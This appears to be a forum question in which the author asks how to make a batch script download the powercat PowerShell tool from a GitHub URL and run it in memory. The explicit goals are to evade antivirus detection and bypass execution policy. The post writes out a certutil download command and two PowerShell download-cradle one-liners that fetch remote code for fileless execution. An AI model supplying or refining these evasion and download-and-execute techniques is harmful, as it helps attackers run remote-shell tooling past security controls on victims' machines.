In my batch script, I am trying to download and execute a powershell script remotely. Here is the url:

https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

I want to download the file into memory (without touching disk), for several reasons:

    It bypasses AV detection
    It bypasses Powershell executionpolicy, so there's no need for the powershell -nop -ep bypass that causes AV detection
    Won't throw unneccessary syntax errors
    You can directly use functions defined inside the .ps1 script

Obviously i can use certutil:

certutil -urlcache -split -f <url>

but I don't want the file to hit disk, which can cause AV detection.
The same thing can be done with easily using other languages, like PowerShell:

(New-Object Net.WebClient).DownloadString($url)

OR

(New-Object IO.StreamReader([Net.HttpWebRequest]::Create($url).GetResponse().GetResponseStream())).ReadToEnd()
